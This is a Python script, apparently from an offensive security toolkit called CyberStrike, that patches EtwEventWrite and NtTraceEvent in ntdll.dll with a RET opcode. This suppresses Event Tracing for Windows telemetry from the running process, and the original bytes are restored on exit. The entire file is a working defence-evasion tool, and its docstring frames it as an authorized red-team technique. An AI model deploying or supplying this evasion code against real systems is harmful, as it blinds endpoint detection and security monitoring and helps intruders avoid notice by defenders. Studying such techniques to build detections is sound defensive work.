#!/usr/bin/env python3
"""
etw_blind.py - Patch ETW functions in current process to suppress telemetry.

Uses ctypes to patch EtwEventWrite and NtTraceEvent in ntdll.dll with a
ret (0xC3) opcode, preventing ETW consumers from receiving events generated
by the current process. Original bytes are saved and can be restored on
exit. This is the Windows equivalent of the eBPF proc_hide/conn_hide
scripts for Linux.

Requires Administrator privileges. Standard red team technique for
authorized penetration testing engagements.

Part of CyberStrike offensive security platform.
"""

import argparse
import ctypes
import ctypes.wintypes
import json
import os
import signal
import sys
import time
from datetime import datetime


# Windows constants
PAGE_EXECUTE_READWRITE = 0x40
RET_OPCODE = b"\xC3"


class EtwPatcher:
    """Patches ETW functions in ntdll.dll to suppress telemetry from this process."""

    def __init__(self, args):
        self.args = args
        self.running = True
        self.patches = []
        self.patch_count = 0

    def _log(self, message, level="info", **extra):
        if self.args.json_output:
            payload = {
                "level": level,
                "message": message,
                "timestamp": datetime.now().isoformat(),
            }
            payload.update(extra)
            print(json.dumps(payload), flush=True)
        else:
            print(f"[etw_blind] {message}", flush=True)

    def check_admin(self):
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin()
        except AttributeError:
            self._log(
                "This script requires Windows with Administrator privileges.",
                level="error",
            )
            sys.exit(1)
        if not is_admin:
            self._log(
                "Administrator privileges required. Run from an elevated prompt.",
                level="error",
            )
            sys.exit(1)

    def print_banner(self):
        print("=" * 70)
        print("  etw_blind.py - ETW Telemetry Suppression (Windows)")
        print("=" * 70)
        print(f"  PID:         {os.getpid()}")
        print(f"  Method:      ntdll.dll in-memory patching")
        print(f"  Targets:     EtwEventWrite, NtTraceEvent")
        print(f"  JSON output: {self.args.json_output}")
        print("=" * 70)
        print()

    def signal_handler(self, signum, frame):
        self.running = False

    def patch_function(self, module_name, function_name):
        """Patch a single function's first byte with RET (0xC3).

        Returns a dict with patch details for later restoration, or None on failure.
        """
        kernel32 = ctypes.windll.kernel32

        # Get module handle
        h_module = kernel32.GetModuleHandleW(module_name)
        if not h_module:
            self._log(
                f"Failed to get handle for {module_name} "
                f"(error={kernel32.GetLastError()})",
                level="error",
                module=module_name,
            )
            return None

        # Get function address
        func_addr = kernel32.GetProcAddress(h_module, function_name.encode("ascii"))
        if not func_addr:
            self._log(
                f"Failed to resolve {function_name} in {module_name} "
                f"(error={kernel32.GetLastError()})",
                level="error",
                module=module_name,
                function=function_name,
            )
            return None

        self._log(
            f"Resolved {function_name} at 0x{func_addr:016X}",
            function=function_name,
            address=f"0x{func_addr:016X}",
        )

        # Read original byte
        original_byte = ctypes.c_char()
        ctypes.memmove(ctypes.addressof(original_byte), func_addr, 1)

        # Change memory protection to PAGE_EXECUTE_READWRITE
        old_protect = ctypes.wintypes.DWORD(0)
        result = kernel32.VirtualProtect(
            ctypes.c_void_p(func_addr),
            ctypes.c_size_t(1),
            PAGE_EXECUTE_READWRITE,
            ctypes.byref(old_protect),
        )
        if not result:
            self._log(
                f"VirtualProtect failed for {function_name} "
                f"(error={kernel32.GetLastError()})",
                level="error",
                function=function_name,
            )
            return None

        # Write RET opcode
        ctypes.memmove(func_addr, RET_OPCODE, 1)

        # Restore original memory protection
        dummy_protect = ctypes.wintypes.DWORD(0)
        kernel32.VirtualProtect(
            ctypes.c_void_p(func_addr),
            ctypes.c_size_t(1),
            old_protect.value,
            ctypes.byref(dummy_protect),
        )

        patch_info = {
            "module": module_name,
            "function": function_name,
            "address": func_addr,
            "original_byte": original_byte.value,
            "old_protect": old_protect.value,
        }

        self.patch_count += 1
        self._log(
            f"Patched {function_name} with RET (0xC3) - original byte: "
            f"0x{original_byte.value[0]:02X}",
            level="event",
            function=function_name,
            address=f"0x{func_addr:016X}",
            original_byte=f"0x{original_byte.value[0]:02X}",
            status="patched",
        )

        return patch_info

    def restore_function(self, patch_info):
        """Restore the original byte for a previously patched function."""
        kernel32 = ctypes.windll.kernel32
        func_addr = patch_info["address"]
        original_byte = patch_info["original_byte"]

        # Change memory protection
        old_protect = ctypes.wintypes.DWORD(0)
        result = kernel32.VirtualProtect(
            ctypes.c_void_p(func_addr),
            ctypes.c_size_t(1),
            PAGE_EXECUTE_READWRITE,
            ctypes.byref(old_protect),
        )
        if not result:
            self._log(
                f"VirtualProtect failed during restore for {patch_info['function']}",
                level="error",
            )
            return False

        # Write original byte back
        ctypes.memmove(func_addr, original_byte, 1)

        # Restore protection
        dummy_protect = ctypes.wintypes.DWORD(0)
        kernel32.VirtualProtect(
            ctypes.c_void_p(func_addr),
            ctypes.c_size_t(1),
            old_protect.value,
            ctypes.byref(dummy_protect),
        )

        self._log(
            f"Restored {patch_info['function']} original byte "
            f"0x{original_byte[0]:02X}",
            level="event",
            function=patch_info["function"],
            status="restored",
        )
        return True

    def verify_patch(self, patch_info):
        """Verify that the patched byte is still 0xC3."""
        current_byte = ctypes.c_char()
        ctypes.memmove(
            ctypes.addressof(current_byte), patch_info["address"], 1
        )
        is_patched = current_byte.value == RET_OPCODE
        self._log(
            f"Verify {patch_info['function']}: "
            f"byte=0x{current_byte.value[0]:02X} "
            f"{'(patched)' if is_patched else '(NOT patched)'}",
            function=patch_info["function"],
            current_byte=f"0x{current_byte.value[0]:02X}",
            verified=is_patched,
        )
        return is_patched

    def run(self):
        self.check_admin()
        self.print_banner()

        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

        # Patch EtwEventWrite
        patch1 = self.patch_function("ntdll.dll", "EtwEventWrite")
        if patch1:
            self.patches.append(patch1)

        # Patch NtTraceEvent
        patch2 = self.patch_function("ntdll.dll", "NtTraceEvent")
        if patch2:
            self.patches.append(patch2)

        if not self.patches:
            self._log("No functions were patched. Exiting.", level="error")
            sys.exit(1)

        # Verify patches
        self._log("Verifying patches...")
        all_verified = True
        for patch_info in self.patches:
            if not self.verify_patch(patch_info):
                all_verified = False

        if all_verified:
            self._log(
                f"ETW blinding active. {len(self.patches)} function(s) patched. "
                f"ETW events from this process are suppressed.",
                level="info",
                patched_count=len(self.patches),
                status="active",
            )
        else:
            self._log(
                "Some patches could not be verified.",
                level="warning",
            )

        self._log("Press Ctrl+C to restore and exit.")

        # Keep running until signal
        while self.running:
            try:
                time.sleep(0.5)
            except KeyboardInterrupt:
                break

        self.cleanup()

    def cleanup(self):
        """Restore all patched functions."""
        self._log("Restoring original function bytes...")
        restored = 0
        for patch_info in self.patches:
            if self.restore_function(patch_info):
                restored += 1

        self._log(
            f"Restored {restored}/{len(self.patches)} function(s). "
            f"ETW telemetry is active again.",
            level="info",
            restored_count=restored,
            total_patches=len(self.patches),
            status="stopped",
        )


def main():
    parser = argparse.ArgumentParser(
        description="Patch ETW functions in ntdll.dll to suppress telemetry from "
        "the current process. Patches EtwEventWrite and NtTraceEvent with "
        "RET opcodes. Restores original bytes on exit.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python etw_blind.py\n"
            "  python etw_blind.py --json-output\n"
        ),
    )
    parser.add_argument(
        "--json-output",
        action="store_true",
        default=False,
        help="Output events as JSON lines for structured consumption.",
    )
    args = parser.parse_args()

    patcher = EtwPatcher(args)

    try:
        patcher.run()
    except SystemExit:
        raise
    except Exception as exc:
        patcher._log(f"Unexpected error: {exc}", level="error")
        patcher.cleanup()
        sys.exit(1)


if __name__ == "__main__":
    main()
